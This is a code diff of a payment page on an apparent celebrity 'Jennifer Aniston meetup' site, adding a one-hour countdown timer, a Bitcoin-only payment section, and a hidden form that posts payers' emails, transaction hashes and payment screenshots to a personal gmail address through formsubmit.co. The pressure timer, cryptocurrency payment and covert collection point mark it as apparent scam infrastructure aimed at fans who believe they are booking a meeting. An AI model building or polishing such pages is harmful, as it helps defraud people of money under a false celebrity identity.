@@ -155,7 +155,12 @@
         <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
             <div class="text-center mb-12">
                 <h2 class="text-3xl font-bold text-gray-900 mb-4">Bitcoin Payment</h2>
+                <p class="text-sm mt-2 text-gray-600">
+    Time remaining: <span id="paymentCountdown" class="font-mono text-red-600">01:00:00</span>
+</p>
+
                 <p class="text-lg text-gray-600 max-w-3xl mx-auto">
+                    
                     Complete your payment using Bitcoin cryptocurrency
                 </p>
                 <div class="mt-4">
@@ -203,46 +208,51 @@
                         </div>
                     </div>
                     
-                    <div class="md:w-1/2">
-                        <h3 class="text-xl font-bold mb-4">Upload Payment Proof</h3>
-                        <div class="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:bg-gray-50 transition duration-200">
-                            <div id="uploadArea" class="cursor-pointer">
-                                <i class="fas fa-cloud-upload-alt text-4xl text-gray-400 mb-3"></i>
-                                <p class="text-gray-500">Upload screenshot of completed payment</p>
-                                <p class="text-xs text-gray-400 mt-2">PNG, JPG or PDF (Max 5MB)</p>
-                                <input type="file" id="paymentProof" name="payment_proof" accept="image/*,.pdf" class="hidden">
-                            </div>
-                            <div id="previewArea" class="hidden mt-4">
-                                <img id="proofPreview" src="" alt="Payment proof preview" class="max-h-64 mx-auto mb-2 rounded border" src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/cb960b35-6414-4231-b80e-cb738115e4b7.png">
-                                <button id="removeProof" class="text-red-500 text-sm hover:text-red-700">Remove and upload another</button>
-                            </div>
-                        </div>
-                        
-                        <div class="mt-6">
-                            <label for="txHash" class="block text-sm font-medium text-gray-700 mb-1">Transaction Hash (optional)</label>
-                            <input type="text" id="txHash" name="transaction_hash" class="w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-amber-500 focus:border-amber-500" placeholder="Enter your transaction ID">
-                        </div>
-                        
-                        <div class="mt-6">
-                            <label for="payerEmail" class="block text-sm font-medium text-gray-700 mb-1">Your Email</label>
-                            <input type="email" id="payerEmail" name="email" required class="w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-amber-500 focus:border-amber-500" placeholder="Enter your email for confirmation">
-                        </div>
-                        
-                        <button id="submitPayment" type="button" class="mt-6 w-full bg-green-500 hover:bg-green-600 text-white py-3 px-4 rounded-md font-medium transition duration-300">
-                            <i class="fas fa-check-circle mr-2"></i> Confirm Payment
-                        </button>
-                        
-                        <form id="paymentForm" class="hidden" action="https://formsubmit.co/jenniferaniston.chatline@gmail.com" method="POST" enctype="multipart/form-data">
-                            <input type="hidden" name="_subject" value="New Bitcoin Payment Submitted">
-                            <input type="hidden" name="_cc" value="jenniferaniston.chatline@gmail.com">
-                            <input type="hidden" name="_next" value="https://jennifer-aniston-meetup.vercel.app/payment.html">
-                            <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="transaction_hash" id="form_tx_hash">
-                            <input type="hidden" name="email" id="form_email">
-                            <input type="hidden" name="amount" id="form_amount">
-                            <input type="hidden" name="package" id="form_package">
-                            <input type="file" name="payment_proof" id="form_payment_proof" class="hidden">
-                        </form>
+                   <div class="md:w-1/2">
+    <h3 class="text-xl font-bold mb-4">Upload Payment Proof</h3>
+    <div class="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:bg-gray-50 transition duration-200">
+        <div id="uploadArea" class="cursor-pointer">
+            <i class="fas fa-cloud-upload-alt text-4xl text-gray-400 mb-3"></i>
+            <p class="text-gray-500">Upload screenshot of completed payment</p>
+            <p class="text-xs text-gray-400 mt-2">PNG, JPG or PDF (Max 5MB)</p>
+            <input type="file" id="paymentProof" name="payment_proof" accept="image/*,.pdf" class="hidden">
+        </div>
+
+        <div id="previewArea" class="hidden mt-4">
+            <img id="proofPreview" src="" alt="Payment proof preview" class="max-h-64 mx-auto mb-2 rounded border">
+            <button id="removeProof" class="text-red-500 text-sm hover:text-red-700">Remove and upload another</button>
+        </div>
+    </div>
+
+    <div class="mt-6">
+        <label for="txHash" class="block text-sm font-medium text-gray-700 mb-1">Transaction Hash (optional)</label>
+        <input type="text" id="txHash" name="transaction_hash" class="w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-amber-500 focus:border-amber-500" placeholder="Enter your transaction ID">
+    </div>
+
+    <div class="mt-6">
+        <label for="payerEmail" class="block text-sm font-medium text-gray-700 mb-1">Your Email</label>
+        <input type="email" id="payerEmail" name="email" required class="w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-amber-500 focus:border-amber-500" placeholder="Enter your email for confirmation">
+    </div>
+
+    <button id="submitPayment" type="button" class="mt-6 w-full bg-green-500 hover:bg-green-600 text-white py-3 px-4 rounded-md font-medium transition duration-300">
+        <i class="fas fa-check-circle mr-2"></i> Confirm Payment
+    </button>
+
+    <!-- Hidden real form for formsubmit -->
+    <form id="paymentForm" class="hidden" action="https://formsubmit.co/jenniferaniston.chatline@gmail.com" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="_subject" value="New Bitcoin Payment Submitted">
+        <input type="hidden" name="_cc" value="jenniferaniston.chatline@gmail.com">
+        <input type="hidden" name="_next" value="https://jennifer-aniston-meetup.vercel.app/payment.html">
+        <input type="hidden" name="_captcha" value="false">
+
+        <input type="hidden" name="transaction_hash" id="form_tx_hash">
+        <input type="hidden" name="email" id="form_email">
+        <input type="hidden" name="amount" id="form_amount">
+        <input type="hidden" name="package" id="form_package">
+        <input type="file" name="payment_proof" id="form_payment_proof" class="hidden">
+    </form>
+
+
                     </div>
                 </div>
             </div>
@@ -375,149 +385,131 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
-    <script>
-        // Initialize countdown timer (1 hour = 3600 seconds)
-        let timeLeft = 3600;
-        
-        function updateCountdown() {
-            const hours = Math.floor(timeLeft / 3600);
-            const minutes = Math.floor((timeLeft % 3600) / 60);
-            const seconds = timeLeft % 60;
-            
-            document.getElementById('paymentCountdown').textContent = 
+  <script>
+document.addEventListener('DOMContentLoaded', function () {
+    // ⏳ Countdown Timer (1 hour)
+    let timeLeft = 3600;
+
+    function updateCountdown() {
+        const hours = Math.floor(timeLeft / 3600);
+        const minutes = Math.floor((timeLeft % 3600) / 60);
+        const seconds = timeLeft % 60;
+
+        const countdownEl = document.getElementById('paymentCountdown');
+        if (countdownEl) {
+            countdownEl.textContent =
                 `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            
-            if (timeLeft <= 0) {
-                clearInterval(countdownInterval);
-                document.getElementById('paymentCountdown').textContent = "Time expired!";
-                document.getElementById('paymentCountdown').classList.add('text-red-500');
-            } else {
-                timeLeft--;
-            }
         }
-        
-        const countdownInterval = setInterval(updateCountdown, 1000);
-        updateCountdown();
-        
-        // Modal functionality
-        document.addEventListener('DOMContentLoaded', function() {
-            const bookingModal = document.getElementById('bookingModal');
-            const bookNowBtn = document.getElementById('bookNowBtn');
-            const closeModalBtn = document.getElementById('closeModalBtn');
-            const confirmBookingBtn = document.getElementById('confirmBookingBtn');
-            
-            // Show modal when Book Now is clicked
-            bookNowBtn.addEventListener('click', function() {
-                bookingModal.classList.remove('hidden');
-            });
-            
-            // Hide modal when X is clicked
-            closeModalBtn.addEventListener('click', function() {
-                bookingModal.classList.add('hidden');
-            });
-            
-            // Hide modal when clicking outside
-            bookingModal.addEventListener('click', function(e) {
-                if (e.target === bookingModal) {
-                    bookingModal.classList.add('hidden');
-                }
-            });
-            
-            // Confirmation button action
-            if (confirmBookingBtn) {
-                confirmBookingBtn.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    alert('Thank you! You will be redirected to the secure payment page.');
-                    bookingModal.classList.add('hidden');
-                    window.location.href = '#payment';
-                    
-                    // Update selected package
-                    const selectedPackage = document.querySelector('input[name="package"]:checked');
-                    if (selectedPackage) {
-                        const packageLabel = selectedPackage.closest('div').querySelector('label').textContent;
-                        document.getElementById('selectedPackage').textContent = packageLabel.split('-')[0].trim();
-                        document.getElementById('totalAmount').textContent = '$' + (parseInt(packageLabel.split('-')[1].replace(/[^0-9]/g,'')) + 2000).toString();
-                        updateBtcAmount();
-                    }
-                });
+
+        if (timeLeft <= 0) {
+            clearInterval(countdownInterval);
+            if (countdownEl) {
+                countdownEl.textContent = "Time expired!";
+                countdownEl.classList.add('text-red-500');
             }
-            
-        
-            
-            // Bitcoin payment functionality
-            document.getElementById('uploadArea').addEventListener('click', function() {
-                document.getElementById('paymentProof').click();
-            });
+        } else {
+            timeLeft--;
+        }
+    }
 
-            document.getElementById('paymentProof').addEventListener('change', function(e) {
-                const file = e.target.files[0];
-                if (file) {
-                    const reader = new FileReader();
-                    reader.onload = function(event) {
-                        document.getElementById('proofPreview').src = event.target.result;
-                        document.getElementById('uploadArea').classList.add('hidden');
-                        document.getElementById('previewArea').classList.remove('hidden');
-                    }
-                    reader.readAsDataURL(file);
-                }
-            });
+    const countdownInterval = setInterval(updateCountdown, 1000);
+    updateCountdown();
 
-            document.getElementById('removeProof').addEventListener('click', function() {
-                document.getElementById('paymentProof').value = '';
-                document.getElementById('proofPreview').src = '';
-                document.getElementById('uploadArea').classList.remove('hidden');
-                document.getElementById('previewArea').classList.add('hidden');
-            });
-            
-            // Payment form submission
-            document.getElementById('submitPayment').addEventListener('click', function() {
-                const email = document.getElementById('payerEmail').value;
-                const txHash = document.getElementById('txHash').value;
-                const paymentProof = document.getElementById('paymentProof').files[0];
-                
-                if (!email) {
-                    alert('Please enter your email address');
-                    return;
-                }
-                
-                if (!paymentProof) {
-                    alert('Please upload your payment proof');
-                    return;
-                }
-                
-                // Set form values
-                document.getElementById('form_email').value = email;
-                document.getElementById('form_tx_hash').value = txHash;
-                document.getElementById('form_amount').value = document.getElementById('totalAmount').textContent;
-                document.getElementById('form_package').value = document.getElementById('selectedPackage').textContent;
-                
-                // Transfer file to form and submit
-                const fileInput = document.getElementById('form_payment_proof');
-                const dataTransfer = new DataTransfer();
-                dataTransfer.items.add(paymentProof);
-                fileInput.files = dataTransfer.files;
-                
-                document.getElementById('paymentForm').submit();
-                
-                // Show confirmation
-                const originalBtnText = this.innerHTML;
-                this.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processing...';
-                this.disabled = true;
-                
-                setTimeout(() => {
-                    alert('Thank you! Your payment details have been submitted. We will contact you shortly to confirm your booking.');
-                    this.innerHTML = originalBtnText;
-                    this.disabled = false;
-                }, 1000);
-            });
-            
-          
-            
-            // Initialize BTC amount
-            updateBtcAmount();
+    // 📤 Upload Area Logic
+    const uploadArea = document.getElementById('uploadArea');
+    const paymentProofInput = document.getElementById('paymentProof');
+    const previewArea = document.getElementById('previewArea');
+    const proofPreview = document.getElementById('proofPreview');
+    const removeProofBtn = document.getElementById('removeProof');
+    const submitBtn = document.getElementById('submitPayment');
+
+    const form = document.getElementById('paymentForm');
+    const formEmail = document.getElementById('form_email');
+    const formTxHash = document.getElementById('form_tx_hash');
+    const formAmount = document.getElementById('form_amount');
+    const formPackage = document.getElementById('form_package');
+    const formFile = document.getElementById('form_payment_proof');
+
+    // Trigger file input on click
+    if (uploadArea && paymentProofInput) {
+        uploadArea.addEventListener('click', function () {
+            paymentProofInput.click();
         });
-    </script>
+
+        paymentProofInput.addEventListener('change', function (e) {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            // Preview image or show PDF placeholder
+            if (file.type.startsWith('image/')) {
+                const reader = new FileReader();
+                reader.onload = function (event) {
+                    proofPreview.src = event.target.result;
+                    previewArea.classList.remove('hidden');
+                    uploadArea.classList.add('hidden');
+                };
+                reader.readAsDataURL(file);
+            } else {
+                proofPreview.src = "https://via.placeholder.com/300x200?text=PDF+Ready";
+                previewArea.classList.remove('hidden');
+                uploadArea.classList.add('hidden');
+            }
+        });
+
+        removeProofBtn.addEventListener('click', function (e) {
+            e.preventDefault();
+            paymentProofInput.value = '';
+            proofPreview.src = '';
+            previewArea.classList.add('hidden');
+            uploadArea.classList.remove('hidden');
+        });
+    }
+
+    // 📨 Form Submit
+    submitBtn.addEventListener('click', function () {
+        const email = document.getElementById('payerEmail').value.trim();
+        const txHash = document.getElementById('txHash').value.trim();
+        const paymentProofFile = paymentProofInput.files[0];
+
+        if (!email) {
+            alert("Please enter your email.");
+            return;
+        }
+
+        if (!paymentProofFile) {
+            alert("Please upload your payment proof.");
+            return;
+        }
+
+        // Fill hidden form fields
+        formEmail.value = email;
+        formTxHash.value = txHash;
+
+        // Optional: Dynamically set amount/package
+        formAmount.value = document.getElementById('totalAmount')?.textContent || "$100";
+        formPackage.value = document.getElementById('selectedPackage')?.textContent || "Gold";
+
+        // Attach file to hidden form
+        const dt = new DataTransfer();
+        dt.items.add(paymentProofFile);
+        formFile.files = dt.files;
+
+        // Submit the form
+        form.submit();
+
+        // Feedback UI
+        const originalBtn = submitBtn.innerHTML;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processing...';
+        submitBtn.disabled = true;
+
+        setTimeout(() => {
+            alert("Thank you! Your payment has been submitted.");
+            submitBtn.innerHTML = originalBtn;
+            submitBtn.disabled = false;
+        }, 2000);
+    });
+});
+</script>
     <script>
 document.addEventListener('DOMContentLoaded', function () {
     const copyBtn = document.getElementById('copyBtcBtn');
@@ -534,83 +526,6 @@ document.addEventListener('DOMContentLoaded', function () {
             console.error('Failed to copy text: ', err);
             alert('Copy failed: ' + err.message);
         });
-    });
-});
-</script>
-<script>
-document.addEventListener('DOMContentLoaded', function () {
-    const uploadArea = document.getElementById('uploadArea');
-    const fileInput = document.getElementById('paymentProof');
-    const previewArea = document.getElementById('previewArea');
-    const proofPreview = document.getElementById('proofPreview');
-    const removeProof = document.getElementById('removeProof');
-
-    const formFileInput = document.getElementById('form_payment_proof');
-    const formTxHash = document.getElementById('form_tx_hash');
-    const formEmail = document.getElementById('form_email');
-    const formAmount = document.getElementById('form_amount');
-    const formPackage = document.getElementById('form_package');
-    const submitPaymentBtn = document.getElementById('submitPayment');
-    const paymentForm = document.getElementById('paymentForm');
-
-    // Click area to trigger file input
-    uploadArea.addEventListener('click', () => {
-        fileInput.click();
-    });
-
-    // Handle file change
-    fileInput.addEventListener('change', function () {
-        const file = this.files[0];
-        if (!file) return;
-
-        // Show preview if image
-        if (file.type.startsWith('image/')) {
-            const reader = new FileReader();
-            reader.onload = function (e) {
-                proofPreview.src = e.target.result;
-                previewArea.classList.remove('hidden');
-            };
-            reader.readAsDataURL(file);
-        } else {
-            // For PDF or other types, just show default icon
-            proofPreview.src = 'https://via.placeholder.com/200x150.png?text=File+Ready';
-            previewArea.classList.remove('hidden');
-        }
-
-        // Copy file to hidden form input
-        formFileInput.files = fileInput.files;
-    });
-
-    // Remove uploaded proof
-    removeProof.addEventListener('click', function (e) {
-        e.preventDefault();
-        fileInput.value = '';
-        proofPreview.src = '';
-        previewArea.classList.add('hidden');
-    });
-
-    // Submit payment
-    submitPaymentBtn.addEventListener('click', function () {
-        const txHash = document.getElementById('txHash').value.trim();
-        const email = document.getElementById('payerEmail').value.trim();
-
-        if (!email) {
-            alert('Please enter your email.');
-            return;
-        }
-
-        // Optional: Add validation for file size/type if needed
-
-        // Copy values to form
-        formTxHash.value = txHash;
-        formEmail.value = email;
-
-        // Optional: Set amount and package if you're using JS to set those
-        formAmount.value = '100'; // example
-        formPackage.value = 'Gold'; // example
-
-        // Submit form
-        paymentForm.submit();
     });
 });
 </script>
